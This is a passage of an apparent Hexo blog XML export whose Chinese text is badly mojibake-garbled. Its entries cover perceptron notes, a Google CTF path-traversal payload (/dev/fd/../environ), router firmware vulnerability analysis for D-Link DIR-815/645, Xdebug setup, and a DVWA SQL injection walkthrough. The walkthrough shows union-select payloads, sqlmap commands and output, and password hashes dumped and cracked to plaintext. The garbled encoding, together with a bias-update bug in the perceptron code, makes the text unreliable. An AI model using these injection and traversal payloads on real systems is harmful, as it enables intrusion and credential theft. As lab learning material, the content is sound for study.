ÊÅíÁ≠âÂèòÊç¢$I$ÁöÑÁâπÂæÅÂêëÈáè $$I(v)=v=1\cdot v$$ ÂèØ‰ª•ÁúãÂà∞ÊâÄÊúâÁöÑÁâπÂæÅÂêëÈáèÈÉΩÊòØÊÅíÁ≠âÂèòÊç¢$I$ÁöÑÁâπÂæÅÂêëÈáèÔºåÊÅíÁ≠âÂèòÊç¢ÁöÑÁâπÂæÅÁ©∫Èó¥Âè™Êúâ‰∏Ä‰∏™Â∞±ÊòØÊï¥‰∏™Á©∫Èó¥ Á±ª‰ººÁöÑÔºåÊï∞‰πòÂèòÊç¢$\lambda I$ÁöÑÁâπÂæÅÂêëÈáè‰πüÊòØÊâÄÊúâÁöÑÈùûÈõ∂ÂêëÈáèÔºåÂõ†‰∏∫ÊåâÁÖßÂÆö‰πâÔºö $$\lambda I(v) = \lambda \cdot v$$ ÊÑüÁü•Âô® ÁúãÂº†ÂõæÔºö Êï∞Â≠¶Ë°®Ëø∞‰∏∫Ôºö$t = f(\sum {i=1}^{n} w{i}x_{i} + b) = f(\mathbf{w}^{T} \mathbf{x})$ fÂáΩÊï∞ÁöÑË°®ËææÂºèÔºö $$f(x) = \left{\begin{matrix} 1 &amp; if , w \cdot x + b &gt; 0 \ 0 &amp; else \end{matrix}\right.$$ $\mathbf{x} = \left [ x_{1}, x_{2} ... , x_{n} , \ 1 \right]^{T}$, $\mathbf{w} = \left [ w_{1}, w_{2} , ...w_{n} , \ b \right]^{T}$ Â¶Ç‰ΩïËÆ≠ÁªÉÔºü Êàë‰ª¨Êù•Áúã‰∏Ä‰∏™ËÆ≠ÁªÉ‰∏éËøêÁÆóÁöÑdemo 123456789101112131415161718192021222324252627282930313233343536373839404142434445import numpy as npdef load_data(): ''' Âä†ËΩΩÊï∞ÊçÆÔºåinput_dataÂíålabelsÂØπÂ∫î ''' input_data = [[1, 1], [0, 0], [1, 0], [0, 1]] labels = [1, 0, 0, 0] return input_data, labelsdef train_pre(input_data, y, iteration, rate): ''' ËÆ≠ÁªÉÔºåÊõ¥Êñ∞wÂíåb ''' unit_step = lambda x: 0 if x &lt; 0 else 1 w = np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' È¢ÑÊµã ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) Êàë‰ª¨ÂæàÊÉäËÆ∂Âú∞ÂèëÁé∞‰∏Ä‰∏™Â¶ÇÊ≠§ÁÆÄÂçïÂú∞Ê®°ÂûãÁ´üÁÑ∂‰∏çÂèØÊÄùËÆÆÂú∞ÂÆåÊàê‰∫ÜËøô‰∏™‰ªªÂä°„ÄÇ Êï∞ÊçÆÊõ¥Êñ∞Ôºö $w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$ ÂºÇÊàñÈóÆÈ¢ò ÂΩìÊó∂ËÄÅÂ∏à‰∏äËØæÊó∂ÂÄôÊèêÂà∞ÂºÇÊàñÈóÆÈ¢òÊòØ‰∏çÂèØËß£ÁöÑÔºåÂêéÊù•Êü•‰∫Ü‰∏Ä‰∏ãËµÑÊñôÊâçÊòéÁôΩÂú®Á•ûÁªèÁΩëÁªúÂèëÂ±ïÁöÑÊó©ÊúüÔºåÂºÇÊàñÈóÆÈ¢òÁ°ÆÂÆûÊòØ‰∏çÂèØËß£ÁöÑÔºå‰∏çËøáÈÄöËøáÂä†ÂÖ•ÈöêËóèÂ±Ç‰ΩøÂæóÂºÇÊàñÈóÆÈ¢òËÉΩÂ§üÊúâ‰∫ÜÊñ∞ÁöÑËß£Ê≥ï Â¶Ç‰∏ãÂõæÔºö Â§ç‰π†ÁöÑÊó∂ÂÄôÊâçÊ≥®ÊÑèÂà∞ÂéüÊù•ËÄÅÂ∏àÊèêÂà∞‰∫ÜÈÄöËøáÂä†ÂÖ•ÈöêËóèÂ±ÇÁöÑÊñπÂºèÊù•Ëß£ÂÜ≥ÂºÇÊàñÈóÆÈ¢ò ÂèÇËÄÉËµÑÊñô „ÄêÊú∫Âô®Â≠¶‰π†„ÄëÁ•ûÁªèÁΩëÁªúÂÆûÁé∞ÂºÇÊàñÔºàXORÔºâ 1.5 ÂõæÂΩ¢ÂåñÁêÜËß£Á•ûÁªèÁΩëÁªú‰∏≠ÁöÑÂºÇÊàñÈóÆÈ¢ò ÊÑüÁü•Âô® wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[‰ªéGooglectf‰∏ÄÈÅìÈ¢òËÆ§ËØÜ‰∏Ä‰∏ãÈìæÊé•Êñá‰ª∂]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[LinuxÁõÆÂΩï Ê∫êËá™Googlectf2017ÁöÑ‰∏ÄÈÅìÈ¢ò ÂèØ‰ª•ÈÄöËøáfÂèÇÊï∞Áõ¥Êé•ËØªÂèñÂà∞ÊÉ≥ËØªÁöÑÊñá‰ª∂ flagËóèÂú® /proc/environ‰∏≠ÔºåÊÄé‰πàÊâçËÉΩËøõÂÖ•Âà∞Ëøô‰∏™ÁõÆÂΩïÔºü Linux‰∏≠Êúâ‰∏Ä‰∏™Âè´ÂÅösymlink method ‰πüÂ∞±ÊòØÁõ∏ÂΩì‰∫é‰∏Ä‰∏™Âø´Êç∑ÊñπÂºèÔºå‰ΩÜÊòØÂç¥‰∏çÂêå‰∫éWindows‰∏≠ÁöÑshortcut ËÄåÊ≠£Â•ΩÔºö/dev/fdËøô‰∏™ÊåáÂêë‰∫Ü/proc/self/fdËøôÊ†∑payloadÂ∞±‰∏çÈöæÁêÜËß£‰∫ÜÔºö /dev/fd/../environ ËÆøÈóÆ/dev/fdÂ∞±Áõ∏ÂΩì‰∫éËÆøÈóÆ‰∫Ü/proc/self‰πãÂêéÂõûÈÄÄ‰∏ÄÊ¨°Â∞±ÂèØ‰ª•ÊâæÂà∞environËøô‰∏™Êñá‰ª∂‰∫Ü Linux‰∏≠ /dev/fd/0ËøêË°åÊïàÊûúÊòØËøôÊ†∑ÁöÑÔºåÁõ∏ÂΩì‰∫é‰Ω†ËæìÂÖ•Âï•ÂÆÉÂ∞±‰ºöÂõûÁ≠îÂï• 12345 ‚úò pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy Êé•‰∏ãÊù•‰∫ÜËß£‰∏Ä‰∏ãlnÂëΩ‰ª§ ËΩØÈìæÊé•ÔºöËã±Êñásymbolic linkÈùûÂ∏∏Á±ª‰ºº‰∫éWindows‰∏≠ÁöÑÂø´Êç∑ÊñπÂºè Á°¨ÈìæÊé•ÔºöËã±Êñáhard linkËøôÁ±ªÊñá‰ª∂‰ºöÊã•ÊúâËá™Â∑±ÁöÑinodeËäÇÁÇπÂíåÂêçÁß∞ÔºåÂÖ∂inode‰ºöÊåáÂêëÊñá‰ª∂ÂÜÖÂÆπÊâÄÂú®ÁöÑÊï∞ÊçÆÂùóemmmÂêéÈù¢‰∏çÊòØÂæàÊáÇ‰∫Ü Âª∫Á´ãËΩØÈìæÊé•ÁöÑÊñπÂºèÔºö ln -s Ê∫êÊñá‰ª∂ÂêçÁß∞ ËΩØÈìæÊé•Êñá‰ª∂ÂêçÁß∞ ÁõÆÂΩïÂíåÊñá‰ª∂ÂùáÂèØ Áé∞Âú®ÂΩìÂâçÂêóÁõÆÂΩï‰∏ãÂàõÂª∫‰∏Ä‰∏™ÊåáÂêë/proc/sysÁöÑÈìæÊé• ÁÑ∂ÂêéÊàë‰ª¨Â∞±ÂèØ‰ª•ÈÄöËøáÁõÆÂΩïÈÅçÂéÜÊù•ËøõÂÖ•Âà∞ÂÖ∂‰ªñÁöÑÁõÆÂΩï‰∫Ü„ÄÇ ËΩØÈìæÊé•Ëøò‰ºöÂ≠òÂú®Ëøô‰∏™ÈóÆÈ¢òÔºö ÈìæÊé•ÁöÑÈáçÂ§çÂÆö‰πâ ËøôÊ†∑Â∞±‰∏ç‰ºöÂá∫ÈóÆÈ¢ò‰∫ÜÔºåÂä†‰∏™-nÈÄâÈ°π ÂèÇËÄÉ]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscodeË∞ÉËØïphp]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[‰ΩøÁî®vscodeË∞ÉËØïphp‰ª£Á†Å ‰∏ãËΩΩxdebug ÂÆòÁΩë ‰ΩÜÊòØÈúÄË¶ÅËá™Â∑±Á°ÆÂÆöphpÁöÑÁâàÊú¨ÂíåÁºñËØëÂô®ÁöÑÁâàÊú¨ ‰ΩÜÊòØÂÆòÁΩëÁöÑÈìæÊé•‰ºº‰πéÊúâÈóÆÈ¢òÔºåphp5.5ÁöÑ‰∏§‰∏™ÂèçËøáÊù•‰∫Ü ‰πãÂêéÂ∞ÜÂÖ∂Ê∑ªÂä†Âà∞php.iniÊñá‰ª∂‰∏≠ 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 Â∞ÜphpÊ∑ªÂä†Âà∞ÁéØÂ¢ÉÂèòÈáè‰∏≠ ËøôÂ∞±‰∏çÁªÜËØ¥‰∫Ü ÈÖçÁΩÆvscode‰∏≠ÁöÑphpË∑ØÂæÑ Âú®settings.json‰∏≠ÊåáÂÆö Ë∞ÉËØï Ë∏©Âà∞ÁöÑÂùë VScodeÁöÑphp debugÊèí‰ª∂ÈªòËÆ§ÊòØÁî®ÁéØÂ¢ÉÂèòÈáè‰∏≠ÁöÑphpÊù•ËøõË°åË∞ÉËØïÁöÑÔºåÊâÄ‰ª•phpÂ¶ÇÊûúÊ≤°ÊúâÂä†ÂÖ•Âà∞ÁéØÂ¢ÉÂèòÈáè‰∏≠ÁöÑËØùÊòØ‰ºöÊä•ÈîôÁöÑ„ÄÇ ÊàëÂàöÂºÄÂßãÁî®‰∫ÜwampserverÁöÑphpÊù•ËøõË°åË∞ÉËØïÔºå‰ΩÜÊòØÂêéÊù•Â§±Ë¥•‰∫ÜÔºåËØ¥ÊòØÊ≤°ÂäûÊ≥ïÂä†ËΩΩxdebugÊèí‰ª∂ÔºåÊâÄ‰ª•Êç¢Êàê‰∫Üphpstudy Êâæ‰∏çÂà∞settingÊñá‰ª∂ÔºüËøô‰∏™ÂùëÂÆ≥ÊÉ®‰∫Ü Âú®Ëøô‰∏™Âú∞ÊñπÈúÄË¶ÅÊ∑ªÂä†phpÁöÑË∑ØÂæÑ ‰∏§ÁßçË∞ÉËØïÊñπÂºèÔºå‰∏ÄÁßçÊòØlisten for xdebugÔºåÈúÄË¶ÅÊâìÂºÄÊµèËßàÂô®ÔºåÂè¶‰∏ÄÁßçÊòØlaunch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815Ê†àÊ∫¢Âá∫ÊºèÊ¥û Â±°Ê¨°Ë∞ÉËØïÈÉΩÂ§±Ë¥•‰∫ÜÔºåÊàëÊâçÂèëÁé∞ÂéüÊù•Ëøô‰∏™ÁâàÊú¨ÁöÑDIR-815Â∑≤Áªè‰øÆÂ§ç‰∫Ü(DIR-815_REVB_FIRMWARE_2.03.B08)„ÄÇ ÊâÄ‰ª•Ëøô‰∏™Ê†àÊ∫¢Âá∫ÊòØ‰∏çÂ≠òÂú®ÁöÑ 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 ÁºìÂÜ≤Âå∫Ê∫¢Âá∫ÊºèÊ¥û Âä®ÊÄÅË∞ÉËØïÔºö Âú®authenticationcgi_mainÂ§Ñ‰∏ãÊñ≠ÁÇπ Ê≠§Êó∂ËøîÂõûÂú∞ÂùÄ‰øùÂ≠òÂú®ËøôÈáåÔºö ‰πãÂêéËøêË°åÂà∞Ê≠§Â§ÑÔºö Ê≠§Êó∂ËøîÂõûÂú∞ÂùÄË¢´Ë¶ÜÁõñ‰∫Ü ÁªßÁª≠ËøêË°åÔºåÁ®ãÂ∫èÊûúÁÑ∂Â¥©Ê∫É‰∫Ü ËøõÂÖ•Âà∞ÂáΩÊï∞sub40A424 Á®ãÂ∫èÂú®Ê≠§Êó∂Â¥©Ê∫É‰∫Ü Â∞ùËØï‰øÆÊîπpasswordÈïøÂ∫¶ Á®ãÂ∫èËøòÊòØÂ¥©Ê∫É‰∫Ü Êü•ÁúãÂèçÊ±áÁºñ‰ª£Á†Å Á®ãÂ∫è‰ªéÂ§ñÈÉ®ËØªÂÖ•CONTENT_LENGTHÊ≤°ÊúâËøõË°å‰ªª‰ΩïÊ£ÄÊü• 12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read ËÆ°ÁÆóÂÅèÁßªÈáèÔºõ ÂêéÈù¢ÁöÑÂà©Áî®ËøáÁ®ãÊÑüËßâÊØîËæÉÂ§çÊùÇÔºåÊ≤°ËÉΩÊàêÂäüÂú∞Â§çÁé∞ DIR-645ÂëΩ‰ª§ÊâßË°åÊºèÊ¥û Âú®ÂÆâÂÖ®ÂÆ¢‰∏äÁúãÂà∞‰∫Ü‰∏ÄÁØáÂàÜÊûêDIR-645ÂëΩ‰ª§ÊâßË°åÂú∞ÊñáÁ´†ÔºåÈöèÂàÜÊûê‰∏Ä‰∏ãÂéüÁêÜ Áõ¥Êé•Êü•Áúãservicecgi_mainÂáΩÊï∞ È¶ñÂÖà‰ºöÂØπËØ∑Ê±ÇÊñπÊ≥ïËøõË°åÂà§Êñ≠ÔºåÂ¶ÇÊûúÊòØPOSTÊñπÊ≥ïÂàô‰ºöË∞ÉÁî®cgibin_parse_requestËß£ÊûêÂèÇÊï∞ÔºåÂÖ∑‰ΩìÁöÑÂÆûÁé∞ÊöÇÊó∂‰∏çËÄÉËôëÔºå‰∏ªË¶ÅÊòØËß£ÊûêCONTENT_TYPEÂíåCONTENT_LENGTH,‰πãÂêé‰ºöË∞ÉÁî®sess_ispoweruserÂà§Êñ≠ÊòØÂê¶‰∏∫ÂêàÊ≥ïÁî®Êà∑ ‰πãÂêéËé∑Âèñ POST Ë°®ÂçïÂ≠óÊÆµÔºåËã•Â≠óÊÆµÂêç‰∏∫ EVENT ÁöÑËØùÔºåÂ∞±Â∞Ü &quot;event %s &gt; /dev/null&quot; ‰Ωú‰∏∫ÂèÇÊï∞ÊâßË°å lxmldbc_system ÂáΩÊï∞„ÄÇ Êü•Áúãlxmldbc_systemÂáΩÊï∞ 123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen ‰∏ªË¶ÅÂÖ≥Ê≥®ÊúÄÂêé‰∏§Êù°Êåá‰ª§ÔºåÂõ†‰∏∫ËøôÈáåÁî®Âà∞‰∫ÜMIPS‰∏≠Âú∞ÂàÜÊîØÂª∂ËøüÊßΩÊäÄÊúØÔºåÊâÄ‰ª•$a1‰º†ÈÄíÂèÇÊï∞ÁöÑÊåá‰ª§Â≠òÊîæÂú®jalrÊåá‰ª§‰πãÂêé ÊïÖvsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4) vsnprintfÂáΩÊï∞ÁöÑÁî®Ê≥ïÔºö ÂáΩÊï∞ÂéüÂûãÔºöint vsnprintf(char str, size_t size, const char format,va_list ap); ÂáΩÊï∞ËØ¥ÊòéÔºöÂ∞ÜÂèØÂèòÂèÇÊï∞Ê†ºÂºèÂåñËæìÂá∫Âà∞‰∏Ä‰∏™Â≠óÁ¨¶Êï∞ÁªÑ ÂèÇÊï∞ÔºöstrËæìÂá∫Âà∞ÁöÑÊï∞ÁªÑÔºåsizeÊåáÂÆöÂ§ßÂ∞èÔºåÈò≤Ê≠¢Ë∂äÁïåÔºåformatÊ†ºÂºèÂåñÂèÇÊï∞ÔºåapÂèØÂèòÂèÇÊï∞ÂàóË°®ÂáΩÊï∞Áî®Ê≥ï Êé•ÁùÄË∞ÉÁî®systemÂáΩÊï∞ 12jalr $t9 ; systemmove $a0, $s0 # command Áúã‰∏Ä‰∏ãÂèÇÊï∞ÁöÑ‰º†ÈÄíËøáÁ®ã $s0Êú¨Êù•ÊòØÊ†à‰∏äÁöÑ‰∏Ä‰∏™ÂèòÈáèÔºåvsnprintfÂ∞ÜÂèØÂèòÂèÇÊï∞Ê†ºÂºèÂåñËæìÂá∫Âà∞ÂÖ∂‰∏≠Ôºå‰πãÂêéÂèàÂ∞ÜÂÖ∂‰Ωú‰∏∫ÂèÇÊï∞‰º†ÈÄíÁªôsystemÂáΩÊï∞ Áõ∏ÂΩì‰∫éÊâßË°å‰∫Ü system(&quot;event %s &gt; /dev/null&quot;) ËøôÊ†∑Â∞±ÂèØ‰ª•ÊÉ≥ÂäûÊ≥ïËøõË°åÂëΩ‰ª§Ê≥®ÂÖ•‰∫Ü ÂèÇËÄÉ Ë∑ØÁî±Âô®ÊºèÊ¥ûÊåñÊéò‰πã DIR-815 Ê†àÊ∫¢Âá∫ÊºèÊ¥ûÂàÜÊûê]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWAÂ≠¶‰π†]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA Áî®ÁöÑvulstudyÁöÑÁéØÂ¢É ÈªòËÆ§Áî®Êà∑ÂêçÊòØadminÂØÜÁ†ÅÊòØpassword ÈúÄË¶ÅÂêØÂä®ÁöÑÊó∂ÂÄôdocker-compose up -dÂ∞±Ë°å‰∫Ü ÂÅúÊ≠¢ÁöÑËØùdocker-compose stopÂÅúÊ≠¢ÂÆπÂô® sqlÊ≥®ÂÖ• ÊúÄÁÆÄÂçïÁöÑ Ê≤°ÂäûÊ≥ïÊòØÊàëÂ§™Ëèú‰∫ÜÔºåÊùÉÂΩìÂ§ç‰π†Â•Ω‰∫Ü üò¢ ËæìÂÖ•1ÂæóÂà∞Ôºö 123ID: 1First name: adminSurname: admin ÁÑ∂ÂêéÂºÄÂßãÁàÜÂ≠óÊÆµ 1' order by 2 # Á°ÆËÆ§ÂõûÊòæ‰ΩçÁΩÆÔºö 1' union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 ÂºÄÂßãÁàÜÊï∞ÊçÆÂ∫ì 1' union select database(),2 # ÂæóÂà∞Êï∞ÊçÆÂ∫ìÂêç 123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 ÂºÄÂßãÁàÜË°® Ë°®ÈÉΩÂ≠òÂú®information_schema.tablesËøôÈáåÈù¢ 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'# ÂæóÂà∞Ôºö 123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 ÂºÄÂßãÁàÜÂ≠óÊÆµ ÁÑ∂ËÄåÊàëÂπ∂‰∏çÁü•ÈÅìÊÄé‰πàÁàÜÂ≠óÊÆµüòû ‰∫éÊòØÁåúÊµãÊòØpassword 1' union select password,2 from users ÂæóÂà∞‰∫ÜÔºö 123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 Â∞èÁôΩ‰πãÊóÖÂà∞Ê≠§ÁªìÊùü ÂçáÁ∫ßÂà∞medium ÊîπÊàê‰∫ÜpostÊñπÂºèÊèê‰∫§Êï∞ÊçÆ ËøôÊó∂ÂÄôsqlmapÊ¥æ‰∏äÁî®Âú∫‰∫Ü ÂÖàÂ∞ÜÊäìÂà∞ÁöÑÊï∞ÊçÆÂåÖ‰øùÂ≠ò‰∏∫dvwa.txtÊñá‰ª∂ ÁÑ∂Âêé python sqlmap.py -r &quot;dvwa.txt&quot; --dbs sqlmapÂæàËÅ™ÊòéÁöÑÂà§Êñ≠Âá∫ËøôÊòØMYSQLÊï∞ÊçÆÂ∫ìÂπ∂‰∏îÂàóÂá∫‰∫ÜÊâÄÊúâÁöÑÊï∞ÊçÆÂ∫ì 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema ‰∏çËøáËøô‰∏™payloadÂæàÁ•ûÂ•á 12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit ÊåáÂÆöÊï∞ÊçÆÂ∫ìÁàÜË°® python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables ÂæóÂà∞Ôºö 123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ ÊåáÂÆöË°®ÁàÜÂ≠óÊÆµ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ ÊåáÂÆöË°®ÁÑ∂ÂêédumpÊï∞ÊçÆ python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all sqlmapÂæàÊú∫Êô∫ÁöÑÂú®Á†¥Ëß£md5 123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; ÂæóÂà∞ÁöÑË°® 12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high ËøôÊó∂ÂÄôÂ∞±Âæà„ÄÇ„ÄÇ ‰ºöÂºπÂá∫‰∏Ä‰∏™È°µÈù¢ÔºåËæìÂÖ•Êï∞ÊçÆ‰πãÂêéÂÜçË∑≥ÂõûÊù• ËøôÂ∞±ÂæàÂÆâÂÖ®‰∫Üüòõ ‰ΩÜÊòØ„ÄÇ„ÄÇ Êü•ÁúãÊ∫êÁ†Å‰πãÂêéÂèëÁé∞Ôºö ÂÖ∂ÂÆûÊ≤°Êúâ‰ªª‰ΩïËøáÊª§Ôºõ 123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); ÊâÄ‰ª•payloadÁÖßÊ†∑Áî®ÔºåÊ≤°ÈóÆÈ¢ò impossible ËøôÊ¨°Â∞±Êõ¥‰∏ç‰∏ÄËà¨‰∫Ü 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; ËøôÈáåÁî®Âà∞‰∫ÜPDOÈ¢ÑÁºñËØëÁöÑÊñπÂºè ÈÇ£ÂèØËÉΩÂ∞±ÁúüÁöÑÊ≤°ÂäûÊ≥ï‰∫Ü Áúã‰∫Ü‰∏ãstackoverflow How can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. ÂèØ‰ª•Êúâ‰∏§ÁßçÊñπÂºèÔºö 1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; ÊàñËÄÖÂØπ‰∫émysqlÊù•ËØ¥ÔºåÂèØ‰ª•Ôºö 123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = 